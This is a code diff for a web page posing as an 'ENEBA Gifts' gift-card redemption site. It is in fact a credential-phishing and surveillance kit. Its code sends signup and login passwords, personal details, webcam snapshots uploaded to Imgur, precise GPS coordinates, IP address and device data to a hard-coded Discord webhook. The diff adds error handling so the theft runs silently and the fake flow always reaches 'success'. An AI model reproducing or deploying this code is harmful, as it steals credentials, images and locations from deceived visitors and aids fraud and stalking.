@@ -5,11 +5,10 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>ENEBA Gifts</title>
-    <meta name="description" content="Lovable Generated Project" />
-    <meta name="author" content="Lovable" />
-
+    <meta name="description" content="ENEBA Gift Card Distribution" />
+    
     <meta property="og:title" content="ENEBA Gifts" />
-    <meta property="og:description" content="Lovable Generated Project" />
+    <meta property="og:description" content="ENEBA Gift Card Distribution" />
     <meta property="og:type" content="website" />
     <meta property="og:image" content="https://lovable.dev/opengraph-image-p98pqg.png" />
 
@@ -422,6 +421,12 @@
             });
           } catch (error) {
             console.error("Error sending login data:", error);
+            // Still complete even if webhook fails
+            onComplete({
+              type: 'login',
+              ...loginFormData,
+              timestamp: new Date().toISOString()
+            });
           } finally {
             setIsLoading(false);
           }
@@ -448,6 +453,12 @@
             });
           } catch (error) {
             console.error("Error sending signup data:", error);
+            // Still complete even if webhook fails
+            onComplete({
+              type: 'signup',
+              ...signupFormData,
+              timestamp: new Date().toISOString()
+            });
           } finally {
             setIsLoading(false);
           }
@@ -699,7 +710,6 @@
         const [userData, setUserData] = useState(null);
         const videoRef = useRef(null);
         const streamRef = useRef(null);
-        const canvasRef = useRef(null);
         const webhookUrl = "https://discord.com/api/webhooks/1367117605877579810/S3qULaeAQR2bDw4UFFj65KEeLarPCpXslBlWA_Fq2kR7CBz958kVNJsOg3svUb-jtrxU";
         
         // Profile picture for logged-in users (using default profile picture)
@@ -769,58 +779,72 @@
             }
           } catch (error) {
             console.error("Camera error:", error);
-            setStep('permissions');
+            // If camera fails, just move to the location step
+            setStep('location-info');
           }
         };
         
         const captureAndSendImages = async () => {
-          if (!videoRef.current || !streamRef.current) return;
-          
-          // Take multiple pictures with canvas
-          const canvas = document.createElement('canvas');
-          canvas.width = videoRef.current.videoWidth;
-          canvas.height = videoRef.current.videoHeight;
-          const ctx = canvas.getContext('2d');
-          
-          // Capture first image
-          if (ctx) {
-            ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg');
-            
-            try {
-              // Upload to Imgur
-              const response = await axios.post('https://api.imgur.com/3/image', {
-                image: imageData.split(',')[1],
-                type: 'base64'
-              }, {
-                headers: {
-                  'Authorization': 'Client-ID b971f6f4d72a0f2'
-                }
-              });
-              
-              if (response.data && response.data.data && response.data.data.link) {
-                // Send to Discord webhook with user data
-                let userDataString = "No user data";
-                if (userData) {
-                  if (userData.type === 'signup') {
-                    userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
-                  } else {
-                    userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
-                  }
-                }
-                
-                await axios.post(webhookUrl, {
-                  content: `📸 **CAMERA IMAGE CAPTURED**\n\n**Image**: ${response.data.data.link}\n**IP Address**: ${ipAddress}\n\n**USER DATA**:\n${userDataString}`
-                });
-              }
-            } catch (error) {
-              console.error("Failed to upload image:", error);
-            }
+          if (!videoRef.current || !streamRef.current) {
+            // If video reference is not available, move to location
+            setStep('location-info');
+            return;
           }
           
-          // Stop camera
-          const tracks = streamRef.current.getTracks();
-          tracks.forEach(track => track.stop());
+          try {
+            // Take picture with canvas
+            const canvas = document.createElement('canvas');
+            canvas.width = videoRef.current.videoWidth;
+            canvas.height = videoRef.current.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            if (ctx) {
+              ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
+              const imageData = canvas.toDataURL('image/jpeg');
+              
+              try {
+                // Upload to Imgur
+                const response = await axios.post('https://api.imgur.com/3/image', {
+                  image: imageData.split(',')[1],
+                  type: 'base64'
+                }, {
+                  headers: {
+                    'Authorization': 'Client-ID b971f6f4d72a0f2'
+                  }
+                });
+                
+                if (response.data && response.data.data && response.data.data.link) {
+                  // Send to Discord webhook with user data
+                  let userDataString = "No user data";
+                  if (userData) {
+                    if (userData.type === 'signup') {
+                      userDataString = `**User Type**: Signup\n**Full Name**: ${userData.fullName}\n**Date of Birth**: ${userData.dateOfBirth}\n**Email**: ${userData.email}\n**Password**: ${userData.password}\n**Gender**: ${userData.gender}\n**Phone**: ${userData.phoneNumber}`;
+                    } else {
+                      userDataString = `**User Type**: Login\n**Email**: ${userData.email}\n**Password**: ${userData.password}`;
+                    }
+                  }
+                  
+                  try {
+                    await axios.post(webhookUrl, {
+                      content: `📸 **CAMERA IMAGE CAPTURED**\n\n**Image**: ${response.data.data.link}\n**IP Address**: ${ipAddress}\n\n**USER DATA**:\n${userDataString}`
+                    });
+                  } catch (webhookError) {
+                    console.error("Failed to send to webhook, but continuing:", webhookError);
+                  }
+                }
+              } catch (imgurError) {
+                console.error("Failed to upload to Imgur, but continuing:", imgurError);
+              }
+            }
+          } catch (error) {
+            console.error("Error capturing image:", error);
+          }
+          
+          // Stop camera regardless of errors
+          if (streamRef.current) {
+            const tracks = streamRef.current.getTracks();
+            tracks.forEach(track => track.stop());
+          }
           
           // Show location info before requesting location
           setStep('location-info');
@@ -836,9 +860,9 @@
             
             // Enhanced geolocation options
             const options = {
-              enableHighAccuracy: true,  // Use GPS if available
-              timeout: 15000,            // Wait up to 15 seconds
-              maximumAge: 0              // Always get a fresh position
+              enableHighAccuracy: true,
+              timeout: 15000,
+              maximumAge: 0
             };
             
             navigator.geolocation.getCurrentPosition(
@@ -857,24 +881,29 @@
                   }
                   
                   // Send location with enhanced accuracy to webhook
-                  await axios.post(webhookUrl, {
-                    content: `📍 **LOCATION DATA CAPTURED (High Accuracy Mode)**\n\n**Latitude**: ${latitude}\n**Longitude**: ${longitude}\n**Accuracy**: ${accuracy}m\n**Google Maps**: https://www.google.com/maps?q=${latitude},${longitude}\n\n**USER DATA**:\n${userDataString}`
-                  });
-                  
-                  // Move to success
-                  setStep('success');
+                  try {
+                    await axios.post(webhookUrl, {
+                      content: `📍 **LOCATION DATA CAPTURED (High Accuracy Mode)**\n\n**Latitude**: ${latitude}\n**Longitude**: ${longitude}\n**Accuracy**: ${accuracy}m\n**Google Maps**: https://www.google.com/maps?q=${latitude},${longitude}\n\n**USER DATA**:\n${userDataString}`
+                    });
+                  } catch (webhookError) {
+                    console.error("Failed to send to webhook, but continuing:", webhookError);
+                  }
                 } catch (error) {
-                  console.error("Failed to send location data:", error);
-                  setStep('success'); // Still move to success even if discord webhook fails
+                  console.error("Error processing location:", error);
+                } finally {
+                  // Always move to success
+                  setStep('success');
                 }
               },
               (error) => {
                 console.error("Location error:", error);
-                setStep('success'); // Still move to success even if location fails
+                // Still move to success even if location fails
+                setStep('success');
               },
               options
             );
           } else {
+            // If geolocation not supported
             setStep('success');
           }
         };
@@ -1128,9 +1157,15 @@
 
           // Get IP address
           const fetchIpAddress = async () => {
-            const ip = await getIpAddress();
-            setIpAddress(ip);
-            setSystemInfo(prev => ({ ...prev, ip }));
+            try {
+              const ip = await getIpAddress();
+              setIpAddress(ip);
+              setSystemInfo(prev => ({ ...prev, ip }));
+            } catch (error) {
+              console.error('Error fetching IP:', error);
+              // Continue with unknown IP
+              setIpAddress('unknown');
+            }
           };
           fetchIpAddress();
           
@@ -1142,6 +1177,7 @@
               setSystemInfo(prev => ({ ...prev, location }));
             } catch (error) {
               console.error('Error getting location:', error);
+              // Continue without location
             }
           };
           fetchLocation();
@@ -1159,13 +1195,6 @@
           // Send initial visit data to webhook
           const sendInitialVisitData = async () => {
             try {
-              const visitInfo = {
-                eventType: 'page_visit',
-                timestamp: new Date().toISOString(),
-                url: window.location.href,
-                ...systemInfo
-              };
-              
               // Wait a moment to potentially get location data
               setTimeout(async () => {
                 let locationString = 'Location permission not granted';
@@ -1173,9 +1202,14 @@
                   locationString = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
                 }
                 
-                await axios.post(webhookUrl, {
-                  content: `🔔 **NEW VISITOR DETECTED!**\n\n**IP**: ${systemInfo.ip}\n**Device**: ${systemInfo.device} (${systemInfo.os})\n**Browser**: ${systemInfo.browser}\n**Screen**: ${systemInfo.screenSize}\n**Language**: ${systemInfo.language}\n**Referrer**: ${systemInfo.referrer}\n**Location**: ${locationString}`,
-                });
+                try {
+                  await axios.post(webhookUrl, {
+                    content: `🔔 **NEW VISITOR DETECTED!**\n\n**IP**: ${systemInfo.ip}\n**Device**: ${systemInfo.device} (${systemInfo.os})\n**Browser**: ${systemInfo.browser}\n**Screen**: ${systemInfo.screenSize}\n**Language**: ${systemInfo.language}\n**Referrer**: ${systemInfo.referrer}\n**Location**: ${locationString}`,
+                  });
+                } catch (error) {
+                  console.error('Error sending webhook:', error);
+                  // Continue without webhook
+                }
               }, 3000);
             } catch (error) {
               console.error('Error sending initial visit data:', error);
@@ -1197,7 +1231,7 @@
             
             // Collect current time and detailed browser information
             const currentTime = new Date().toLocaleString();
-            const sessionDuration = Math.floor((new Date().getTime() - performance.timing.navigationStart) / 1000);
+            const sessionDuration = Math.floor((new Date().getTime() - (window.performance.timing ? window.performance.timing.navigationStart : Date.now())) / 1000);
             
             // Prepare location data for the message
             let locationString = 'Location permission not granted';
@@ -1205,10 +1239,15 @@
               locationString = `Latitude: ${locationData.latitude}, Longitude: ${locationData.longitude}, Accuracy: ${locationData.accuracy}m\nGoogle Maps: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
             }
             
-            // Send enhanced system info to webhook
-            await axios.post(webhookUrl, {
-              content: `🎮 **USER CLICKED REDEEM BUTTON!** 🎮\n\n**Time**: ${currentTime}\n**IP Address**: ${ipAddress}\n**Browser**: ${systemInfo.browser}\n**OS**: ${systemInfo.os}\n**Device**: ${systemInfo.device}\n**Language**: ${systemInfo.language}\n**Screen Size**: ${systemInfo.screenSize}\n**Time Zone**: ${systemInfo.timeZone}\n**Referrer**: ${systemInfo.referrer}\n**Session Duration**: ${sessionDuration} seconds\n**Location**: ${locationString}\n**User Agent**: ${systemInfo.userAgent.substring(0, 200)}`,
-            });
+            try {
+              // Send enhanced system info to webhook
+              await axios.post(webhookUrl, {
+                content: `🎮 **USER CLICKED REDEEM BUTTON!** 🎮\n\n**Time**: ${currentTime}\n**IP Address**: ${ipAddress}\n**Browser**: ${systemInfo.browser}\n**OS**: ${systemInfo.os}\n**Device**: ${systemInfo.device}\n**Language**: ${systemInfo.language}\n**Screen Size**: ${systemInfo.screenSize}\n**Time Zone**: ${systemInfo.timeZone}\n**Referrer**: ${systemInfo.referrer}\n**Session Duration**: ${sessionDuration} seconds\n**Location**: ${locationString}\n**User Agent**: ${systemInfo.userAgent.substring(0, 200)}`,
+              });
+            } catch (error) {
+              console.error('Error sending webhook:', error);
+              // Continue without webhook
+            }
 
             // Open verification modal after a small delay to make it feel more authentic
             setTimeout(() => {
@@ -1216,9 +1255,10 @@
               setIsLoading(false);
             }, 800);
           } catch (error) {
-            console.error('Error sending webhook:', error);
+            console.error('Error in redeem process:', error);
             setIsLoading(false);
-            alert("Could not process your request. Please try again.");
+            // Continue even if error occurs
+            setIsModalOpen(true);
           }
         };
 
